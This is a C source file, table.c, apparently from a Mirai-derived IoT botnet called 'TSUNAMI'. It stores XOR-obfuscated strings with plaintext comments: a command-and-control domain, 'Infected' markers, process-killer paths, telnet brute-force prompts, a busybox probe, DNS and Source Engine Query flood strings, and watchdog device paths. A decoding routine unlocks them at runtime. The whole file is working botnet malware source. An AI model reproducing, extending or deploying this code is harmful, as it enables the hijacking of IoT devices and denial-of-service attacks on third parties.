#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0x33c001de;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
	add_entry(TABLE_DOMAIN, "\x5C\x5E\x45\x5F\x41\x5B\x4D\x5E\x49\x02\x4F\x4A\x2C", 13); // prismware.cf

	add_entry(TABLE_EXEC_SUCCESS, "\x65\x42\x4A\x49\x4F\x58\x49\x48\x2C", 9); // Infected
	
    add_entry(TABLE_KILLER_PROC, "\x4D\x12\x10\x0D\x01\x4D\x62", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\x4D\x07\x1A\x07\x62", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\x4D\x04\x06\x62", 4); // /fd
	add_entry(TABLE_KILLER_TCP, "\x4D\x12\x10\x0D\x01\x4D\x0C\x07\x16\x4D\x16\x01\x12\x62", 14); // /proc/net/tcp
	add_entry(TABLE_KILLER_MAPS, "\x4D\x0F\x03\x12\x11\x62", 6); // /maps
	add_entry(TABLE_MEM_ROUTE, "\x4D\x12\x10\x0D\x01\x4D\x0C\x07\x16\x4D\x10\x0D\x17\x16\x07\x62", 16); // /proc/net/route
	add_entry(TABLE_MEM_ASSWORD, "\x03\x11\x11\x15\x0D\x10\x06\x62", 8); // assword
	add_entry(TABLE_KILLER_STATUS, "\x4D\x11\x16\x03\x16\x17\x11\x62", 8); // /status

	add_entry(TABLE_ATK_VSE, "\x36\x31\x0D\x17\x10\x01\x07\x42\x27\x0C\x05\x0B\x0C\x07\x42\x33\x17\x07\x10\x1B\x62", 21); // TSource Engine Query
	add_entry(TABLE_ATK_RESOLVER, "\x4D\x07\x16\x01\x4D\x10\x07\x11\x0D\x0E\x14\x4C\x01\x0D\x0C\x04\x62", 17); // /etc/resolv.conf
	add_entry(TABLE_ATK_NSERV, "\x0C\x03\x0F\x07\x11\x07\x10\x14\x07\x10\x62", 11); // nameserver
	
	add_entry(TABLE_SCAN_OGIN, "\x0D\x05\x0B\x0C\x62", 5); // ogin
    add_entry(TABLE_SCAN_ENTER, "\x07\x0C\x16\x07\x10\x62", 6); // enter
    add_entry(TABLE_SCAN_ASSWORD, "\x03\x11\x11\x15\x0D\x10\x06\x62", 8); // assword
	add_entry(TABLE_SCAN_QUERY, "\x4D\x00\x0B\x0C\x4D\x00\x17\x11\x1B\x00\x0D\x1A\x42\x2A\x2B\x29\x23\x30\x2B\x62", 20); // /bin/busybox TSUNAMI
    add_entry(TABLE_SCAN_RESP, "\x2A\x2B\x29\x23\x30\x2B\x58\x42\x03\x12\x12\x0E\x07\x16\x42\x0C\x0D\x16\x42\x04\x0D\x17\x0C\x06\x62", 25); // TSUNAMI: applet not found
    add_entry(TABLE_SCAN_NCORRECT, "\x0C\x01\x0D\x10\x10\x07\x01\x16\x62", 9); // ncorrect
	add_entry(TABLE_SCAN_ENABLE, "\x07\x0C\x03\x00\x0E\x07\x62", 7); // enable
	add_entry(TABLE_SCAN_SYSTEM, "\x11\x1B\x11\x16\x07\x0F\x62", 7); // system
	add_entry(TABLE_SCAN_SHELL, "\x11\x0A\x07\x0E\x0E\x62", 6); // shell
	add_entry(TABLE_SCAN_SH, "\x11\x0A\x62", 3); // sh 
	
	add_entry(TABLE_MISC_RAND, "\x53\x05\x00\x03\x56\x01\x06\x0D\x0F\x57\x51\x0C\x0A\x12\x53\x50\x07\x0B\x07\x05\x03\x07\x62", 23); 
	add_entry(TABLE_MISC_DOG, "\x4D\x06\x07\x14\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 14); // /dev/watchdog
	add_entry(TABLE_MISC_DOG1, "\x4D\x06\x07\x14\x4D\x0F\x0B\x11\x01\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 19); // /dev/misc/watchdog
	add_entry(TABLE_MISC_DOG2, "\x4D\x06\x07\x14\x4D\x24\x36\x35\x26\x36\x53\x52\x53\x3D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 23); // /dev/FTWDT101_watchdog
	add_entry(TABLE_MISC_DOG3, "\x4D\x06\x07\x14\x4D\x24\x36\x35\x26\x36\x53\x52\x53\x3E\x42\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 24); // /dev/FTWDT101\ watchdog
	add_entry(TABLE_MISC_DOG4, "\x4D\x06\x07\x14\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x52\x62", 15); // /dev/watchdog0
	add_entry(TABLE_MISC_DOG5, "\x4D\x07\x16\x01\x4D\x06\x07\x04\x03\x17\x0E\x16\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 22); // /etc/default/watchdog
	add_entry(TABLE_MISC_DOG6, "\x4D\x11\x00\x0B\x0C\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 15); // /sbin/watchdog
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}

